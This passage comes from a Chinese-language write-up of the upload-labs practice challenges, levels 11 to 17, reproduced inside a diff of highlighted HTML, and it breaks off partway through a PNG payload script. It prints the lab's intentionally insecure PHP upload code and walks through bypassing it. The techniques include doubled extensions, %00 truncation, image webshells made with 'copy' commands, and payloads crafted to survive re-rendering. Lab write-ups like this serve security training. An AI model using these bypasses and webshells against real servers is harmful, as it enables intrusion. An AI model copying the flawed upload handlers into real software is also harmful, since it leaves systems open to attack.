+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;php&#34;</span>,<span style="color:#2aa198">&#34;php5&#34;</span>,<span style="color:#2aa198">&#34;php4&#34;</span>,<span style="color:#2aa198">&#34;php3&#34;</span>,<span style="color:#2aa198">&#34;php2&#34;</span>,<span style="color:#2aa198">&#34;html&#34;</span>,<span style="color:#2aa198">&#34;htm&#34;</span>,<span style="color:#2aa198">&#34;phtml&#34;</span>,<span style="color:#2aa198">&#34;pht&#34;</span>,<span style="color:#2aa198">&#34;jsp&#34;</span>,<span style="color:#2aa198">&#34;jspa&#34;</span>,<span style="color:#2aa198">&#34;jspx&#34;</span>,<span style="color:#2aa198">&#34;jsw&#34;</span>,<span style="color:#2aa198">&#34;jsv&#34;</span>,<span style="color:#2aa198">&#34;jspf&#34;</span>,<span style="color:#2aa198">&#34;jtml&#34;</span>,<span style="color:#2aa198">&#34;asp&#34;</span>,<span style="color:#2aa198">&#34;aspx&#34;</span>,<span style="color:#2aa198">&#34;asa&#34;</span>,<span style="color:#2aa198">&#34;asax&#34;</span>,<span style="color:#2aa198">&#34;ascx&#34;</span>,<span style="color:#2aa198">&#34;ashx&#34;</span>,<span style="color:#2aa198">&#34;asmx&#34;</span>,<span style="color:#2aa198">&#34;cer&#34;</span>,<span style="color:#2aa198">&#34;swf&#34;</span>,<span style="color:#2aa198">&#34;htaccess&#34;</span>,<span style="color:#2aa198">&#34;ini&#34;</span>);
+
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#268bd2">$deny_ext</span>,<span style="color:#2aa198">&#34;&#34;</span>, <span style="color:#268bd2">$file_name</span>);
+        <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+        <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_name</span>;        
+        <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+            <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+        }
+</code></pre></div><p>可以看到,文件名中限制的文件后缀出现就会被替换为空</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#268bd2">$deny_ext</span>,<span style="color:#2aa198">&#34;&#34;</span>, <span style="color:#268bd2">$file_name</span>)
+</code></pre></div><p>所以可以使用双写来bypass,如<strong>1.pphphp</strong></p>
+<h3 id="pass-12">pass-12</h3>
+<p>黑名单关卡告一段落,接下里迎来的白名单</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span>(isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])){
+    <span style="color:#268bd2">$ext_arr</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#39;jpg&#39;</span>,<span style="color:#2aa198">&#39;png&#39;</span>,<span style="color:#2aa198">&#39;gif&#39;</span>);
+    <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> substr(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>],strrpos(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>],<span style="color:#2aa198">&#34;.&#34;</span>)<span style="color:#719e07">+</span><span style="color:#2aa198">1</span>);
+    <span style="color:#719e07">if</span>(in_array(<span style="color:#268bd2">$file_ext</span>,<span style="color:#268bd2">$ext_arr</span>)){
+        <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+        <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#39;save_path&#39;</span>]<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;/&#34;</span><span style="color:#719e07">.</span>rand(<span style="color:#2aa198">10</span>, <span style="color:#2aa198">99</span>)<span style="color:#719e07">.</span>date(<span style="color:#2aa198">&#34;YmdHis&#34;</span>)<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;.&#34;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_ext</span>;
+
+        <span style="color:#719e07">if</span>(move_uploaded_file(<span style="color:#268bd2">$temp_file</span>,<span style="color:#268bd2">$img_path</span>)){
+            <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+        }
+    } <span style="color:#719e07">else</span>{
+        <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;只允许上传.jpg|.png|.gif类型文件！&#34;</span>;
+    }
+</code></pre></div><p>可以发现的是这关上传目录是可控的</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$_GET[&#39;save_path&#39;]
+</code></pre></div><p>这里的save_path是使用的get方法,所需使用%00截断</p>
+<p>但是这里值得注意的是,需要符合以下两个条件才可以实现</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#2aa198">1.</span>php版本<span style="color:#719e07">&lt;</span><span style="color:#2aa198">5.3</span><span style="color:#719e07">.</span><span style="color:#2aa198">4</span>
+<span style="color:#2aa198">2.</span>php开启magic_quotes_gpc,即Off 
+</code></pre></div><p><img src="images/upload-labs-challenge/12-1.png" alt="12-1"></p>
+<p>上传后访问1.php即可</p>
+<p><img src="images/upload-labs-challenge/12-2.png" alt="12-2"></p>
+<h3 id="pass-13">pass-13</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span>(isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])){
+    <span style="color:#268bd2">$ext_arr</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#39;jpg&#39;</span>,<span style="color:#2aa198">&#39;png&#39;</span>,<span style="color:#2aa198">&#39;gif&#39;</span>);
+    <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> substr(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>],strrpos(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>],<span style="color:#2aa198">&#34;.&#34;</span>)<span style="color:#719e07">+</span><span style="color:#2aa198">1</span>);
+    <span style="color:#719e07">if</span>(in_array(<span style="color:#268bd2">$file_ext</span>,<span style="color:#268bd2">$ext_arr</span>)){
+        <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+        <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;save_path&#39;</span>]<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;/&#34;</span><span style="color:#719e07">.</span>rand(<span style="color:#2aa198">10</span>, <span style="color:#2aa198">99</span>)<span style="color:#719e07">.</span>date(<span style="color:#2aa198">&#34;YmdHis&#34;</span>)<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;.&#34;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_ext</span>;
+
+        <span style="color:#719e07">if</span>(move_uploaded_file(<span style="color:#268bd2">$temp_file</span>,<span style="color:#268bd2">$img_path</span>)){
+            <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;上传失败&#34;</span>;
+        }
+    } <span style="color:#719e07">else</span> {
+        <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;只允许上传.jpg|.png|.gif类型文件！&#34;</span>;
+    }
+}
+
+</code></pre></div><p>这里和上一关的区别就是,save_path变成了post</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$_POST[&#39;save_path&#39;]
+</code></pre></div><p>post的话就不会想get那样url会自动解码</p>
+<p>所需这里的00截断需要在hex更改</p>
+<p>这里注意php的后面还有个空格,方便等下更改</p>
+<p><img src="images/upload-labs-challenge/13-1.png" alt="13-1"></p>
+<p>空格在十六进制中为0x20 即下图的20,所以把这个20修改为00就可以实现bypass</p>
+<p><img src="images/upload-labs-challenge/13-2.png" alt="13-2"></p>
+<p><img src="images/upload-labs-challenge/13-4.png" alt="13-4"></p>
+<h3 id="pass-14">pass-14</h3>
+<p>这一关已经说了需要图片马,需要文件包含漏洞的文件能够运行图片马中的恶意代码</p>
+<p>而且需要三种图片格式都上传成功才算过关(jpg,png,gif)</p>
+<p>那么这里我准备了三个正常格式的图片和一个php文件</p>
+<p><img src="images/upload-labs-challenge/14-1.png" alt="14-1"></p>
+<p>然后使用命令直接合成木马,最后得jpg就是合成的图片马</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">copy 1.jpg/b + 1.php/a jpg.jpg 
+</code></pre></div><p>以下代码也可看到,检测文件头的前面两个字节</p>
+<p>因为这是命令合成的马所以可以稳稳当当的上传</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">function</span> <span style="color:#268bd2">getReailFileType</span>(<span style="color:#268bd2">$filename</span>){
+    <span style="color:#268bd2">$file</span> <span style="color:#719e07">=</span> fopen(<span style="color:#268bd2">$filename</span>, <span style="color:#2aa198">&#34;rb&#34;</span>);
+    <span style="color:#268bd2">$bin</span> <span style="color:#719e07">=</span> fread(<span style="color:#268bd2">$file</span>, <span style="color:#2aa198">2</span>); <span style="color:#586e75">//只读2字节
+</span><span style="color:#586e75"></span>    fclose(<span style="color:#268bd2">$file</span>);
+    <span style="color:#268bd2">$strInfo</span> <span style="color:#719e07">=</span> <span style="color:#719e07">@</span>unpack(<span style="color:#2aa198">&#34;C2chars&#34;</span>, <span style="color:#268bd2">$bin</span>);    
+    <span style="color:#268bd2">$typeCode</span> <span style="color:#719e07">=</span> intval(<span style="color:#268bd2">$strInfo</span>[<span style="color:#2aa198">&#39;chars1&#39;</span>]<span style="color:#719e07">.</span><span style="color:#268bd2">$strInfo</span>[<span style="color:#2aa198">&#39;chars2&#39;</span>]);    
+    <span style="color:#268bd2">$fileType</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;&#39;</span>;    
+    <span style="color:#719e07">switch</span>(<span style="color:#268bd2">$typeCode</span>){      
+        <span style="color:#719e07">case</span> <span style="color:#2aa198">255216</span><span style="color:#719e07">:</span>            
+            <span style="color:#268bd2">$fileType</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;jpg&#39;</span>;
+            <span style="color:#719e07">break</span>;
+        <span style="color:#719e07">case</span> <span style="color:#2aa198">13780</span><span style="color:#719e07">:</span>            
+            <span style="color:#268bd2">$fileType</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;png&#39;</span>;
+            <span style="color:#719e07">break</span>;        
+        <span style="color:#719e07">case</span> <span style="color:#2aa198">7173</span><span style="color:#719e07">:</span>            
+            <span style="color:#268bd2">$fileType</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;gif&#39;</span>;
+            <span style="color:#719e07">break</span>;
+        <span style="color:#719e07">default</span><span style="color:#719e07">:</span>            
+            <span style="color:#268bd2">$fileType</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;unknown&#39;</span>;
+        }    
+        <span style="color:#719e07">return</span> <span style="color:#268bd2">$fileType</span>;
+}
+
+<span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">false</span>;
+<span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#719e07">null</span>;
+<span style="color:#719e07">if</span>(isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])){
+    <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+    <span style="color:#268bd2">$file_type</span> <span style="color:#719e07">=</span> getReailFileType(<span style="color:#268bd2">$temp_file</span>);
+
+    <span style="color:#719e07">if</span>(<span style="color:#268bd2">$file_type</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">&#39;unknown&#39;</span>){
+        <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;文件未知，上传失败！&#34;</span>;
+    }<span style="color:#719e07">else</span>{
+        <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;/&#34;</span><span style="color:#719e07">.</span>rand(<span style="color:#2aa198">10</span>, <span style="color:#2aa198">99</span>)<span style="color:#719e07">.</span>date(<span style="color:#2aa198">&#34;YmdHis&#34;</span>)<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;.&#34;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_type</span>;
+        <span style="color:#719e07">if</span>(move_uploaded_file(<span style="color:#268bd2">$temp_file</span>,<span style="color:#268bd2">$img_path</span>)){
+            <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;上传出错！&#34;</span>;
+        }
+    }
+}
+</code></pre></div><p>上传后利用包含漏洞来包含就可以显示出来了</p>
+<p><img src="images/upload-labs-challenge/14-2.png" alt="14-2"></p>
+<p><img src="images/upload-labs-challenge/14-3.png" alt="14-3"></p>
+<p><img src="images/upload-labs-challenge/14-4.png" alt="14-4"></p>
+<h3 id="pass-15">pass-15</h3>
+<p>依旧是检查内容</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">function</span> <span style="color:#268bd2">isImage</span>(<span style="color:#268bd2">$filename</span>){
+    <span style="color:#268bd2">$types</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;.jpeg|.png|.gif&#39;</span>;
+    <span style="color:#719e07">if</span>(file_exists(<span style="color:#268bd2">$filename</span>)){
+        <span style="color:#268bd2">$info</span> <span style="color:#719e07">=</span> getimagesize(<span style="color:#268bd2">$filename</span>);
+        <span style="color:#268bd2">$ext</span> <span style="color:#719e07">=</span> image_type_to_extension(<span style="color:#268bd2">$info</span>[<span style="color:#2aa198">2</span>]);
+        <span style="color:#719e07">if</span>(stripos(<span style="color:#268bd2">$types</span>,<span style="color:#268bd2">$ext</span>)<span style="color:#719e07">&gt;=</span><span style="color:#2aa198">0</span>){
+            <span style="color:#719e07">return</span> <span style="color:#268bd2">$ext</span>;
+        }<span style="color:#719e07">else</span>{
+            <span style="color:#719e07">return</span> <span style="color:#719e07">false</span>;
+        }
+    }<span style="color:#719e07">else</span>{
+        <span style="color:#719e07">return</span> <span style="color:#719e07">false</span>;
+    }
+}
+
+</code></pre></div><p>这里是通过<strong>getimagesize()</strong> 来检测是否是图片,下面是这个函数的官方解释</p>
+<p><strong>函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息</strong></p>
+<p>所以这个和上一个思路是一样的</p>
+<p>上关只检测前两个字节,这个是判断是否为图片</p>
+<p>上关使用的图片马也有可能出现出现错误(原因可能是这张图片被插坏了)</p>
+<p>把合成图片马的命令换一下,说不定就行了</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">copy /b 1.png+1.php 222.png
+</code></pre></div><p>但其实随便上传个正常个图片,burp抓包在文件内容末尾加入相应代码也可行</p>
+<h3 id="pass-16">pass-16</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">function</span> <span style="color:#268bd2">isImage</span>(<span style="color:#268bd2">$filename</span>){
+    <span style="color:#586e75">//需要开启php_exif模块
+</span><span style="color:#586e75"></span>    <span style="color:#268bd2">$image_type</span> <span style="color:#719e07">=</span> exif_imagetype(<span style="color:#268bd2">$filename</span>);
+    <span style="color:#719e07">switch</span> (<span style="color:#268bd2">$image_type</span>) {
+        <span style="color:#719e07">case</span> IMAGETYPE_GIF<span style="color:#719e07">:</span>
+            <span style="color:#719e07">return</span> <span style="color:#2aa198">&#34;gif&#34;</span>;
+            <span style="color:#719e07">break</span>;
+        <span style="color:#719e07">case</span> IMAGETYPE_JPEG<span style="color:#719e07">:</span>
+            <span style="color:#719e07">return</span> <span style="color:#2aa198">&#34;jpg&#34;</span>;
+            <span style="color:#719e07">break</span>;
+        <span style="color:#719e07">case</span> IMAGETYPE_PNG<span style="color:#719e07">:</span>
+            <span style="color:#719e07">return</span> <span style="color:#2aa198">&#34;png&#34;</span>;
+            <span style="color:#719e07">break</span>;    
+        <span style="color:#719e07">default</span><span style="color:#719e07">:</span>
+            <span style="color:#719e07">return</span> <span style="color:#719e07">false</span>;
+            <span style="color:#719e07">break</span>;
+    }
+}
+</code></pre></div><p>注释都已经给提示了,这还有啥好说的,开冲</p>
+<p>考察的是exif_imagetype检测</p>
+<p>当然这里依旧能够使用刚刚使用的图片马就可以过</p>
+<p>(所以这里经历了三关类似的关卡)</p>
+<h3 id="pass-17">pass-17</h3>
+<h5 id="gif部分">gif部分</h5>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">else</span> <span style="color:#719e07">if</span>((<span style="color:#268bd2">$fileext</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">&#34;gif&#34;</span>) <span style="color:#719e07">&amp;&amp;</span> (<span style="color:#268bd2">$filetype</span><span style="color:#719e07">==</span><span style="color:#2aa198">&#34;image/gif&#34;</span>)){
+        <span style="color:#719e07">if</span>(move_uploaded_file(<span style="color:#268bd2">$tmpname</span>,<span style="color:#268bd2">$target_path</span>)){
+            <span style="color:#586e75">//使用上传的图片生成新的图片
+</span><span style="color:#586e75"></span>            <span style="color:#268bd2">$im</span> <span style="color:#719e07">=</span> imagecreatefromgif(<span style="color:#268bd2">$target_path</span>);
+            <span style="color:#719e07">if</span>(<span style="color:#268bd2">$im</span> <span style="color:#719e07">==</span> <span style="color:#719e07">false</span>){
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;该文件不是gif格式的图片！&#34;</span>;
+                <span style="color:#719e07">@</span>unlink(<span style="color:#268bd2">$target_path</span>);
+            }<span style="color:#719e07">else</span>{
+                <span style="color:#586e75">//给新图片指定文件名
+</span><span style="color:#586e75"></span>                srand(time());
+                <span style="color:#268bd2">$newfilename</span> <span style="color:#719e07">=</span> strval(rand())<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;.gif&#34;</span>;
+                <span style="color:#586e75">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+</span><span style="color:#586e75"></span>                <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$newfilename</span>;
+                imagegif(<span style="color:#268bd2">$im</span>,<span style="color:#268bd2">$img_path</span>);
+
+                <span style="color:#719e07">@</span>unlink(<span style="color:#268bd2">$target_path</span>);
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            }
+        } 
+</code></pre></div><p>之所以分成三个部分是因为代码虽然一样,但是这三种格式的图片处理流程是不一样的</p>
+<p>下面先看看gif,从代码中可以看到上传图片后,这图片会被重新的渲染,形成新的图片</p>
+<p>上传个图片马发现php代码部分已经没有了</p>
+<p><img src="images/upload-labs-challenge/17-1.png" alt="17-1"></p>
+<p>这时候把这帮被二次渲染的图片拿来和没被渲染的图片马来比较</p>
+<p>可以看到下图中红框内的是被更改的内容</p>
+<p>这时候只要在上面添加相应的php代码,然后重新上传就可以实现bypass</p>
+<p><img src="images/upload-labs-challenge/17-2.png" alt="17-2"></p>
+<p><img src="images/upload-labs-challenge/17-3.png" alt="17-3"></p>
+<h5 id="jpg部分">jpg部分</h5>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
+  	<span style="color:#719e07">if</span>((<span style="color:#268bd2">$fileext</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">&#34;jpg&#34;</span>) <span style="color:#719e07">&amp;&amp;</span> (<span style="color:#268bd2">$filetype</span><span style="color:#719e07">==</span><span style="color:#2aa198">&#34;image/jpeg&#34;</span>)){
+        <span style="color:#719e07">if</span>(move_uploaded_file(<span style="color:#268bd2">$tmpname</span>,<span style="color:#268bd2">$target_path</span>)){
+            <span style="color:#586e75">//使用上传的图片生成新的图片
+</span><span style="color:#586e75"></span>            <span style="color:#268bd2">$im</span> <span style="color:#719e07">=</span> imagecreatefromjpeg(<span style="color:#268bd2">$target_path</span>);
+
+            <span style="color:#719e07">if</span>(<span style="color:#268bd2">$im</span> <span style="color:#719e07">==</span> <span style="color:#719e07">false</span>){
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;该文件不是jpg格式的图片！&#34;</span>;
+                <span style="color:#719e07">@</span>unlink(<span style="color:#268bd2">$target_path</span>);
+            }<span style="color:#719e07">else</span>{
+                <span style="color:#586e75">//给新图片指定文件名
+</span><span style="color:#586e75"></span>                srand(time());
+                <span style="color:#268bd2">$newfilename</span> <span style="color:#719e07">=</span> strval(rand())<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;.jpg&#34;</span>;
+                <span style="color:#586e75">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+</span><span style="color:#586e75"></span>                <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$newfilename</span>;
+                imagejpeg(<span style="color:#268bd2">$im</span>,<span style="color:#268bd2">$img_path</span>);
+                <span style="color:#719e07">@</span>unlink(<span style="color:#268bd2">$target_path</span>);
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;上传出错！&#34;</span>;
+        }
+
+    }
+
+    
+</code></pre></div><p>这里需要用到</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://github.com/BlackFan/jpg_payload
+</code></pre></div><p><img src="images/upload-labs-challenge/17-4.png" alt="17-4"></p>
+<p>(这里好像有个bug,就是这图片没有重新命名)</p>
+<p><img src="images/upload-labs-challenge/17-5.png" alt="17-5"></p>
+<h5 id="png部分">png部分</h5>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">else</span> <span style="color:#719e07">if</span>((<span style="color:#268bd2">$fileext</span> <span style="color:#719e07">==</span> <span style="color:#2aa198">&#34;png&#34;</span>) <span style="color:#719e07">&amp;&amp;</span> (<span style="color:#268bd2">$filetype</span><span style="color:#719e07">==</span><span style="color:#2aa198">&#34;image/png&#34;</span>)){
+        <span style="color:#719e07">if</span>(move_uploaded_file(<span style="color:#268bd2">$tmpname</span>,<span style="color:#268bd2">$target_path</span>)){
+            <span style="color:#586e75">//使用上传的图片生成新的图片
+</span><span style="color:#586e75"></span>            <span style="color:#268bd2">$im</span> <span style="color:#719e07">=</span> imagecreatefrompng(<span style="color:#268bd2">$target_path</span>);
+
+            <span style="color:#719e07">if</span>(<span style="color:#268bd2">$im</span> <span style="color:#719e07">==</span> <span style="color:#719e07">false</span>){
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;该文件不是png格式的图片！&#34;</span>;
+                <span style="color:#719e07">@</span>unlink(<span style="color:#268bd2">$target_path</span>);
+            }<span style="color:#719e07">else</span>{
+                 <span style="color:#586e75">//给新图片指定文件名
+</span><span style="color:#586e75"></span>                srand(time());
+                <span style="color:#268bd2">$newfilename</span> <span style="color:#719e07">=</span> strval(rand())<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;.png&#34;</span>;
+                <span style="color:#586e75">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+</span><span style="color:#586e75"></span>                <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$newfilename</span>;
+                imagepng(<span style="color:#268bd2">$im</span>,<span style="color:#268bd2">$img_path</span>);
+
+                <span style="color:#719e07">@</span>unlink(<span style="color:#268bd2">$target_path</span>);
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;               
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;上传出错！&#34;</span>;
+        }
+</code></pre></div><p>原理可以参考</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">https<span style="color:#719e07">://</span>xz<span style="color:#719e07">.</span>aliyun<span style="color:#719e07">.</span>com<span style="color:#719e07">/</span>t<span style="color:#719e07">/</span><span style="color:#2aa198">2657</span><span style="color:#586e75">#toc-3
+</span></code></pre></div><p>直接搬上脚本</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+<span style="color:#268bd2">$p</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">0xa3</span>, <span style="color:#2aa198">0x9f</span>, <span style="color:#2aa198">0x67</span>, <span style="color:#2aa198">0xf7</span>, <span style="color:#2aa198">0x0e</span>, <span style="color:#2aa198">0x93</span>, <span style="color:#2aa198">0x1b</span>, <span style="color:#2aa198">0x23</span>,
+           <span style="color:#2aa198">0xbe</span>, <span style="color:#2aa198">0x2c</span>, <span style="color:#2aa198">0x8a</span>, <span style="color:#2aa198">0xd0</span>, <span style="color:#2aa198">0x80</span>, <span style="color:#2aa198">0xf9</span>, <span style="color:#2aa198">0xe1</span>, <span style="color:#2aa198">0xae</span>,
+           <span style="color:#2aa198">0x22</span>, <span style="color:#2aa198">0xf6</span>, <span style="color:#2aa198">0xd9</span>, <span style="color:#2aa198">0x43</span>, <span style="color:#2aa198">0x5d</span>, <span style="color:#2aa198">0xfb</span>, <span style="color:#2aa198">0xae</span>, <span style="color:#2aa198">0xcc</span>,
